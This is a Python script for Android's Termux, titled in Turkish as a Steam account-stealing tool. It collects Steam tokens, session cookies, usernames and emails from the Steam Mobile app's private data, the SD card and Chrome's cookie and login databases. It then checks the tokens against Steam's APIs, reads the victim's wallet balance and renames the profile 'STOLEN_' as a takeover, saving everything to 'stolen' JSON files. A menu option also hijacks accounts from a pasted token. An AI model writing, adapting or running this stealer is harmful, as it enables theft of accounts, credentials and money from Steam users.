#!/data/data/com.termux/files/usr/bin/python3
"""
STEAM HESAP CALMA ARACI v2 - TERMUX OPTIMIZE
Hedef: Steam Mobile uygulamasi ve Steam Web
Giris gerektirmez - Local verileri tarar
"""

import os
import sys
import time
import json
import base64
import random
import re
import sqlite3
import requests
import shutil
from datetime import datetime
from urllib.parse import urlparse, parse_qs

# ============================================================
# KONFIGURASYON
# ============================================================

OUTPUT_DIR = "/sdcard/steam_pentest"
STEAM_API = "https://api.steampowered.com"
STEAM_COMMUNITY = "https://steamcommunity.com"
STEAM_STORE = "https://store.steampowered.com"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Android 14; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0",
]

# ============================================================
# STEAM MOBILE VERITABANI YOLLARI (TERMUX)
# ============================================================

STEAM_MOBILE_PATHS = [
    # Ana yol - Steam Mobile uygulamasi
    "/data/data/com.valvesoftware.android.steam.community/",
    "/data/data/com.valvesoftware.android.steam.community/databases/",
    "/data/data/com.valvesoftware.android.steam.community/shared_prefs/",
    "/data/data/com.valvesoftware.android.steam.community/files/",
    
    # SDCard yedekleri
    "/sdcard/Android/data/com.valvesoftware.android.steam.community/",
    "/sdcard/Android/data/com.valvesoftware.android.steam.community/files/",
    "/sdcard/Android/obb/com.valvesoftware.android.steam.community/",
    
    # Internal storage
    "/storage/emulated/0/Android/data/com.valvesoftware.android.steam.community/",
    "/storage/emulated/0/Android/data/com.valvesoftware.android.steam.community/files/",
    
    # Steam Web (Chrome custom tab)
    "/data/data/com.android.chrome/app_chrome/Default/Cookies",
    "/data/data/com.android.chrome/app_chrome/Default/Login Data",
    "/data/data/com.android.chrome/app_chrome/Default/Web Data",
    
    # Termux local
    "/data/data/com.termux/files/home/.steam/",
    "/data/data/com.termux/files/home/.config/steam/",
]

# Steam veritabani tablolari ve sorgulari
STEAM_DB_QUERIES = {
    "accounts": "SELECT * FROM accounts",
    "users": "SELECT * FROM users",
    "sessions": "SELECT * FROM sessions",
    "tokens": "SELECT * FROM tokens",
    "auth": "SELECT * FROM auth",
    "credentials": "SELECT * FROM credentials",
    "login": "SELECT * FROM login",
    "cookies": "SELECT * FROM cookies",
    "preferences": "SELECT * FROM preferences",
}


class SteamTermuxStealer:
    """Termux'ta Steam hesap calma - giris gerektirmez"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": random.choice(USER_AGENTS),
        })
        
        self.found_accounts = []
        self.found_tokens = []
        self.found_cookies = {}
        self.found_credentials = []
        self.found_databases = []
        
        # Output dizini
        if not os.path.exists(OUTPUT_DIR):
            try:
                os.makedirs(OUTPUT_DIR)
            except:
                OUTPUT_DIR = os.path.expanduser("~/steam_pentest")
                os.makedirs(OUTPUT_DIR, exist_ok=True)
    
    # ============================================================
    # 1. STEAM MOBILE VERITABANI TARAMA
    # ============================================================
    
    def scan_all(self):
        """Tum tarama yontemlerini calistir"""
        print("\n" + "="*60)
        print("  TAM TARAMA BASLATILDI")
        print("="*60)
        
        # 1. Steam Mobile DB tara
        print("\n[1/5] Steam Mobile veritabani taranıyor...")
        self.scan_steam_databases()
        
        # 2. Shared preferences tara
        print("\n[2/5] Shared preferences taranıyor...")
        self.scan_shared_prefs()
        
        # 3. Dosya sisteminde token ara
        print("\n[3/5] Dosya sisteminde token araniyor...")
        self.scan_filesystem()
        
        # 4. Chrome cookie tara
        print("\n[4/5] Chrome cookie taranıyor...")
        self.scan_chrome_cookies()
        
        # 5. Bulunanlari analiz et
        print("\n[5/5] Bulunan veriler analiz ediliyor...")
        self.analyze_findings()
        
        # Rapor
        self.generate_report()
        
        return {
            "databases": len(self.found_databases),
            "accounts": len(self.found_accounts),
            "tokens": len(self.found_tokens),
            "cookies": len(self.found_cookies),
            "credentials": len(self.found_credentials),
        }
    
    def scan_steam_databases(self):
        """Steam Mobile SQLite veritabanlarini tara"""
        
        for base_path in STEAM_MOBILE_PATHS:
            if not os.path.exists(base_path):
                continue
            
            print(f"  [*] Taranıyor: {base_path}")
            
            # .db ve .sqlite dosyalarini bul
            for root, dirs, files in os.walk(base_path):
                for file in files:
                    if file.endswith((".db", ".sqlite", ".sqlite3")):
                        db_path = os.path.join(root, file)
                        self._analyze_database(db_path)
                    
                    # JSON dosyalari
                    elif file.endswith(".json"):
                        json_path = os.path.join(root, file)
                        self._analyze_json(json_path)
                    
                    # Config dosyalari
                    elif file.endswith((".xml", ".conf", ".cfg", ".txt")):
                        text_path = os.path.join(root, file)
                        self._analyze_text(text_path)
    
    def _analyze_database(self, db_path):
        """SQLite veritabanini analiz et"""
        try:
            # Dosyayi kopyala (kilitli olabilir)
            temp_path = f"/data/data/com.termux/files/home/.temp_steam.db"
            shutil.copy2(db_path, temp_path)
            
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            
            # Tablolari listele
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
            tables = cursor.fetchall()
            
            if tables:
                print(f"    [+] Veritabani: {db_path}")
                print(f"       Tablolar: {len(tables)}")
                self.found_databases.append(db_path)
                
                # Her tabloyu kontrol et
                for table in tables:
                    table_name = table[0]
                    try:
                        cursor.execute(f"PRAGMA table_info({table_name});")
                        columns = cursor.fetchall()
                        col_names = [c[1] for c in columns]
                        
                        # Steam ile ilgili kolonlar
                        steam_keywords = ["token", "session", "login", "password", "auth", 
                                         "credential", "cookie", "steam", "account", "user",
                                         "key", "secret", "refresh", "access"]
                        
                        if any(k in " ".join(col_names).lower() for k in steam_keywords):
                            # Verileri al
                            cursor.execute(f"SELECT * FROM {table_name} LIMIT 50;")
                            rows = cursor.fetchall()
                            
                            if rows:
                                print(f"       [!] Tablo '{table_name}' STEAM VERISI ICERIYOR!")
                                print(f"           Kolonlar: {col_names}")
                                print(f"           Kayit: {len(rows)}")
                                
                                # Verileri analiz et
                                for row in rows:
                                    row_data = dict(zip(col_names, row))
                                    self._extract_steam_data(row_data, db_path, table_name)
                                    
                    except Exception:
                        pass
            
            conn.close()
            os.remove(temp_path)
            
        except Exception as e:
            pass
    
    def _extract_steam_data(self, data, source, table):
        """Veritabani satirindan Steam verilerini cikar"""
        
        for key, value in data.items():
            if value is None:
                continue
                
            value_str = str(value)
            
            # Access Token (JWT)
            if any(k in key.lower() for k in ["token", "access", "jwt", "bearer"]):
                if len(value_str) > 50 and value_str.startswith("eyJ"):
                    self.found_tokens.append({
                        "token": value_str,
                        "source": source,
                        "type": "access_token"
                    })
                    print(f"           [TOKEN] Access Token bulundu: {value_str[:40]}...")
            
            # Refresh Token
            elif any(k in key.lower() for k in ["refresh", "rtoken"]):
                if len(value_str) > 30:
                    self.found_tokens.append({
                        "token": value_str,
                        "source": source,
                        "type": "refresh_token"
                    })
                    print(f"           [TOKEN] Refresh Token: {value_str[:30]}...")
            
            # Steam ID
            elif any(k in key.lower() for k in ["steamid", "steam_id", "sid"]):
                if value_str.isdigit() and len(value_str) == 17:
                    self.found_accounts.append({
                        "steamid": value_str,
                        "source": source,
                        "table": table
                    })
                    print(f"           [ACCOUNT] SteamID: {value_str}")
            
            # Kullanici adi / email
            elif any(k in key.lower() for k in ["email", "username", "account", "login"]):
                if "@" in value_str or len(value_str) > 3:
                    self.found_credentials.append({
                        "type": key,
                        "value": value_str,
                        "source": source
                    })
                    print(f"           [CRED] {key}: {value_str}")
            
            # Cookie
            elif "cookie" in key.lower():
                if "steamLogin" in value_str or "sessionid" in value_str:
                    self.found_cookies[source] = value_str
                    print(f"           [COOKIE] Steam cookie: {value_str[:50]}...")
    
    def scan_shared_prefs(self):
        """Shared Preferences XML dosyalarini tara"""
        
        pref_paths = [
            "/data/data/com.valvesoftware.android.steam.community/shared_prefs/",
            "/data/data/com.termux/files/home/.steam/",
        ]
        
        for pref_path in pref_paths:
            if not os.path.exists(pref_path):
                continue
            
            for file in os.listdir(pref_path):
                if file.endswith(".xml"):
                    filepath = os.path.join(pref_path, file)
                    try:
                        with open(filepath, "r", errors="ignore") as f:
                            content = f.read()
                        
                        # Steam anahtarlari
                        patterns = [
                            r'<string name="([^"]+)">([^<]+)</string>',
                            r'name="([^"]+)"\s*value="([^"]+)"',
                            r'"([^"]+)"\s*:\s*"([^"]+)"',
                        ]
                        
                        for pattern in patterns:
                            matches = re.findall(pattern, content)
                            for key, value in matches:
                                key_lower = key.lower()
                                
                                if any(k in key_lower for k in ["token", "steam", "password", "auth", "login", "key"]):
                                    print(f"    [+] {file}: {key} = {value[:40]}...")
                                    
                                    if "token" in key_lower and len(value) > 50:
                                        self.found_tokens.append({
                                            "token": value,
                                            "source": filepath,
                                            "type": "pref_token"
                                        })
                                    elif "steamid" in key_lower:
                                        self.found_accounts.append({
                                            "steamid": value,
                                            "source": filepath
                                        })
                    
                    except Exception:
                        pass
    
    def scan_filesystem(self):
        """Dosya sisteminde token ara"""
        
        search_paths = [
            "/data/data/com.termux/files/home/",
            "/sdcard/",
            "/sdcard/Download/",
            "/sdcard/Documents/",
        ]
        
        # Aranacak dosya adlari
        target_files = [
            "steam", "token", "login", "auth", "cookie", "account",
            "credential", "password", "session", "api_key", "secret",
            "config", "settings", "profile", "user_data"
        ]
        
        for base_path in search_paths:
            if not os.path.exists(base_path):
                continue
            
            try:
                for root, dirs, files in os.walk(base_path):
                    for file in files:
                        # Sadece certain dosya tipleri
                        if any(file.lower().startswith(t) for t in target_files):
                            filepath = os.path.join(root, file)
                            try:
                                with open(filepath, "r", errors="ignore") as f:
                                    content = f.read()
                                
                                # Token pattern
                                self._extract_tokens_from_text(content, filepath)
                                
                            except Exception:
                                pass
            except Exception:
                pass
    
    def _extract_tokens_from_text(self, text, source):
        """Metin icinden token'lari cikar"""
        
        # JWT token
        jwt_pattern = r'eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+'
        for match in re.findall(jwt_pattern, text):
            if len(match) > 100:
                self.found_tokens.append({
                    "token": match,
                    "source": source,
                    "type": "jwt"
                })
                print(f"    [TOKEN] JWT: {match[:30]}...")
        
        # Steam refresh token
        refresh_pattern = r'(access_token|refresh_token)=([a-zA-Z0-9_\-%]+)'
        for match in re.findall(refresh_pattern, text, re.IGNORECASE):
            if len(match[1]) > 40:
                self.found_tokens.append({
                    "token": match[1],
                    "source": source,
                    "type": match[0].lower()
                })
                print(f"    [TOKEN] {match[0]}: {match[1][:30]}...")
        
        # Steam login cookie
        cookie_pattern = r'steamLogin=([a-zA-Z0-9%]+)'
        for match in re.findall(cookie_pattern, text):
            self.found_cookies[source] = f"steamLogin={match}"
            print(f"    [COOKIE] steamLogin bulundu!")
    
    def scan_chrome_cookies(self):
        """Chrome cookie veritabanindan Steam cookie'lerini al"""
        
        chrome_paths = [
            "/data/data/com.android.chrome/app_chrome/Default/Cookies",
            "/data/data/com.android.chrome/app_chrome/Default/Login Data",
            "/data/data/org.chromium.chrome/app_chrome/Default/Cookies",
        ]
        
        for cookie_path in chrome_paths:
            if not os.path.exists(cookie_path):
                continue
            
            try:
                temp_path = "/data/data/com.termux/files/home/.temp_cookies.db"
                shutil.copy2(cookie_path, temp_path)
                
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                
                # Cookies tablosu
                try:
                    cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies WHERE host_key LIKE '%steam%' OR host_key LIKE '%steampowered%';")
                    rows = cursor.fetchall()
                    
                    for row in rows:
                        host, name, value, enc = row
                        if name in ["steamLogin", "steamID", "sessionid", "steamLoginSecure"]:
                            self.found_cookies[f"{host}/{name}"] = value
                            print(f"    [COOKIE] Chrome: {host} -> {name} = {value[:30]}...")
                
                except Exception:
                    pass
                
                conn.close()
                os.remove(temp_path)
                
            except Exception:
                pass
    
    def analyze_findings(self):
        """Bulunan verileri analiz et ve token test et"""
        
        print("\n[*] Token analizi baslatiliyor...")
        
        for token_entry in self.found_tokens[:10]:  # Ilk 10 token
            token = token_entry["token"]
            
            # JWT decode dene
            try:
                parts = token.split(".")
                if len(parts) == 3:
                    payload_b64 = parts[1]
                    # Padding ekle
                    payload_b64 += "=" * (4 - len(payload_b64) % 4)
                    payload = base64.b64decode(payload_b64)
                    payload_data = json.loads(payload)
                    
                    steam_id = payload_data.get("sub") or payload_data.get("steam_id") or payload_data.get("oid")
                    if steam_id:
                        print(f"\n  [*] Token test ediliyor: SteamID={steam_id}")
                        
                        # Token'i dene
                        test_session = requests.Session()
                        test_session.headers["Authorization"] = f"Bearer {token}"
                        
                        try:
                            res = test_session.post(
                                f"{STEAM_API}/IPlayerService/GetSteamLevel/v1/",
                                data={"access_token": token, "steamid": steam_id},
                                timeout=10
                            )
                            
                            if res.status_code == 200:
                                level = res.json().get("response", {}).get("player_level", 0)
                                print(f"    [+] TOKEN GECERLI! Level: {level}")
                                
                                # Hesabi ele gecir
                                self.hijack_account(steam_id, token)
                                
                        except Exception as e:
                            print(f"    [-] Token test hatasi: {e}")
            
            except Exception:
                pass
    
    # ============================================================
    # 2. HESAP ELE GECIRME
    # ============================================================
    
    def hijack_account(self, steam_id, access_token):
        """Hesabi ele gecir - token ile tam erisim"""
        
        print(f"\n    [*] Hesap ele geciriliyor: {steam_id}")
        
        hijack_session = requests.Session()
        hijack_session.headers.update({
            "Authorization": f"Bearer {access_token}",
        })
        
        stolen = {
            "steam_id": steam_id,
            "access_token": access_token,
            "timestamp": time.time(),
            "verified": True
        }
        
        # Profil bilgisi
        try:
            prof = hijack_session.get(
                f"{STEAM_API}/ISteamUser/GetPlayerSummaries/v2/",
                params={"key": "", "steamids": steam_id},
                headers={"Authorization": f"Bearer {access_token}"},
                timeout=10
            )
            if prof.status_code == 200:
                players = prof.json().get("response", {}).get("players", [])
                if players:
                    p = players[0]
                    stolen["username"] = p.get("personaname")
                    stolen["profile_url"] = p.get("profileurl")
                    print(f"    [+] Kullanici: {stolen['username']}")
        except Exception:
            pass
        
        # Cuzdan
        try:
            wallet = hijack_session.get(
                f"{STEAM_STORE}/api/getwalletinfoofuser/",
                params={"access_token": access_token},
                timeout=10
            )
            if wallet.status_code == 200 and wallet.json().get("success") == 1:
                w = wallet.json()
                stolen["balance"] = w.get("wallet_balance", 0) / 100
                stolen["currency"] = w.get("wallet_currency", "")
                print(f"    [+] Bakiye: {stolen['balance']} {stolen['currency']}")
        except Exception:
            pass
        
        # Badge/Level
        try:
            badge = hijack_session.post(
                f"{STEAM_API}/IPlayerService/GetBadges/v1/",
                data={"access_token": access_token, "steamid": steam_id},
                timeout=10
            )
            if badge.status_code == 200:
                b = badge.json().get("response", {})
                stolen["level"] = b.get("player_level", 0)
                stolen["xp"] = b.get("player_xp", 0)
                stolen["badge_count"] = len(b.get("badges", []))
                print(f"    [+] Seviye: {stolen['level']} | Rozet: {stolen['badge_count']}")
        except Exception:
            pass
        
        # Profil takeover
        print(f"    [*] Profil degistiriliyor...")
        try:
            new_name = f"STOLEN_{random.randint(1000,9999)}"
            takeover = hijack_session.post(
                f"{STEAM_API}/ISteamUser/UpdateProfile/v1/",
                data={
                    "access_token": access_token,
                    "steamid": steam_id,
                    "personaname": new_name,
                    "summary": "This account has been compromised. Security test."
                },
                headers={"Authorization": f"Bearer {access_token}"},
                timeout=10
            )
            if takeover.status_code == 200:
                stolen["profile_takeover"] = True
                stolen["new_name"] = new_name
                print(f"    [+] PROFIL DEGISTIRILDI! Yeni isim: {new_name}")
        except Exception:
            pass
        
        self.found_accounts.append(stolen)
        self._save_account(stolen)
        
        return stolen
    
    def _save_account(self, data):
        """Ele gecirilen hesabi kaydet"""
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{OUTPUT_DIR}/stolen_{data['steam_id']}_{ts}.json"
        
        with open(filename, "w") as f:
            json.dump(data, f, indent=2, default=str)
        
        print(f"    [+] Kaydedildi: {filename}")
    
    # ============================================================
    # 3. RAPOR
    # ============================================================
    
    def generate_report(self):
        """Ozet rapor olustur"""
        
        report = {
            "timestamp": datetime.now().isoformat(),
            "device": "Termux/Android",
            "summary": {
                "databases_found": len(self.found_databases),
                "accounts_found": len(self.found_accounts),
                "tokens_found": len(self.found_tokens),
                "cookies_found": len(self.found_cookies),
                "credentials_found": len(self.found_credentials),
            },
            "databases": self.found_databases[:20],
            "accounts": [{
                "steamid": a.get("steamid"),
                "username": a.get("username", "N/A"),
                "balance": a.get("balance", 0),
                "level": a.get("level", 0),
                "takeover": a.get("profile_takeover", False)
            } for a in self.found_accounts],
            "tokens": [{
                "type": t.get("type"),
                "preview": t["token"][:30] + "..."
            } for t in self.found_tokens[:20]],
            "cookies": list(self.found_cookies.keys())[:20],
        }
        
        filename = f"{OUTPUT_DIR}/report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, "w") as f:
            json.dump(report, f, indent=2)
        
        print(f"\n[+] Rapor kaydedildi: {filename}")
        return report


# ============================================================
# MENU
# ============================================================

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    clear_screen()
    print("="*60)
    print("  STEAM HESAP CALMA v2 - TERMUX")
    print("  Hedef: Steam Mobile & Web")
    print("  GIRIS GEREKTIRMEZ")
    print("="*60)

def main():
    stealer = SteamTermuxStealer()
    
    # Root kontrol
    root_access = os.geteuid() == 0 if hasattr(os, 'geteuid') else False
    
    while True:
        show_banner()
        
        print("\nRoot yetkisi:", "VAR" if root_access else "YOK (sinirli)")
        print("Output:", OUTPUT_DIR)
        print("\n[1] TAM TARAMA BASLAT (Tumunu Tara)")
        print("[2] Sadece Steam Mobile DB Tara")
        print("[3] Sadece Dosya Sistemi Tara")
        print("[4] Sadece Chrome Cookie Tara")
        print("[5] Bulunan Token'lari Test Et")
        print("[6] Manuel Token ile Hesap Ele Gecir")
        print("[7] Sonuclari Goruntule")
        print("[0] Cikis")
        print("="*60)
        
        choice = input("\nSecim: ").strip()
        
        if choice == "1":
            print("\n[!] Tam tarama baslatiliyor... (Bu biraz surebilir)")
            print("[!] Root yetkisi varsa daha fazla veri bulunabilir")
            
            if input("\nDevam? (E/H): ").strip().upper() == "E":
                results = stealer.scan_all()
                
                print("\n" + "="*60)
                print("  TARAMA TAMAMLANDI!")
                print("="*60)
                print(f"  Veritabani: {results['databases']}")
                print(f"  Hesap: {results['accounts']}")
                print(f"  Token: {results['tokens']}")
                print(f"  Cookie: {results['cookies']}")
                print(f"  Kimlik: {results['credentials']}")
                print("="*60)
                
                if results['accounts'] > 0:
                    print("\n[!] Hesaplar ele gecirildi ve kaydedildi!")
                if results['tokens'] > 0:
                    print("[!] Token'lar test edildi!")
            
            input("\nDevam etmek icin Enter...")
        
        elif choice == "2":
            stealer.scan_steam_databases()
            input("\nDevam etmek icin Enter...")
        
        elif choice == "3":
            stealer.scan_filesystem()
            input("\nDevam etmek icin Enter...")
        
        elif choice == "4":
            stealer.scan_chrome_cookies()
            input("\nDevam etmek icin Enter...")
        
        elif choice == "5":
            if stealer.found_tokens:
                stealer.analyze_findings()
            else:
                print("\n[-] Once tarama yapin (Menu 1-4)")
            input("\nDevam etmek icin Enter...")
        
        elif choice == "6":
            print("\n[*] Manuel Token ile Hesap Ele Gecir")
            token = input("Access Token: ").strip()
            steam_id = input("SteamID64: ").strip() or "76561197960265728"
            
            if token:
                stealer.hijack_account(steam_id, token)
            input("\nDevam etmek icin Enter...")
        
        elif choice == "7":
            print("\n=== SONUCLAR ===")
            print(f"\nVeritabani: {len(stealer.found_databases)}")
            for db in stealer.found_databases[:5]:
                print(f"  - {db}")
            
            print(f"\nHesap: {len(stealer.found_accounts)}")
            for acc in stealer.found_accounts[:5]:
                print(f"  - {acc.get('steamid')} | {acc.get('username', 'N/A')} | Level: {acc.get('level', '?')} | Bakiye: {acc.get('balance', '?')}")
            
            print(f"\nToken: {len(stealer.found_tokens)}")
            for t in stealer.found_tokens[:5]:
                print(f"  - {t.get('type')}: {t['token'][:30]}...")
            
            print(f"\nCookie: {len(stealer.found_cookies)}")
            for k in list(stealer.found_cookies.keys())[:5]:
                print(f"  - {k}")
            
            input("\nDevam etmek icin Enter...")
        
        elif choice == "0":
            print("\n[*] Cikiliyor...")
            print(f"[+] Output: {OUTPUT_DIR}/")
            if stealer.found_accounts:
                print(f"[+] Ele gecirilen hesap: {len(stealer.found_accounts)}")
            sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[*] Durduruldu.")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Hata: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
